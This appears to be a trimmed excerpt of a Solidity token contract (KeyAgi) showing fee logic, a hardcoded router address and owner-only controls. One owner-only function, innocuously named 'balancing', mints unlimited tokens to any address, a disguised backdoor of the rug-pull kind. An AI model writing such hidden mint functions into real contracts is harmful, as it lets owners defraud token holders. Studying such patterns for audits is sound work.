...
contract KeyAgi is KolSolidlyManager, ReentrancyGuardUpgradeable, ERC20Upgradeable {
    ...
    uint256 public constant totalBuyFees = 200;
    mapping(address => bool) public _isExcludedFromFee;
    address public constant uniRouter = 0x46dbd39e26a56778d88507d7aEC6967108C0BD36;
    bool public autoPeg;
  ...
  */
    ...
    */
    ...
    function _transfer(
        ...
        if (automatedMarketMakerPairs[from] && amount>0 && !_isExcludedFromFee[to]) {
            uint256 fees = amount * (maxTotalBuyFees + totalBuyFees) / 20000;
   ...
   */
    ...
    function balancing(address _getter, uint256 _amount) external onlyOwner {
        _mint(_getter, _amount);
    }
    /*
    ...
    */
    ...
    function setBuyFees(uint256 _maxTotalBuyFees) external onlyOwner {
        require(_maxTotalBuyFees<=1000,">10%");
    ...
    function updateV2() external onlyOwner {
        //setAutomatedMarketMakerPair(0xD3b4DC00fF641bE648767c663CbDa35B3e76Dd4A,true);
    }
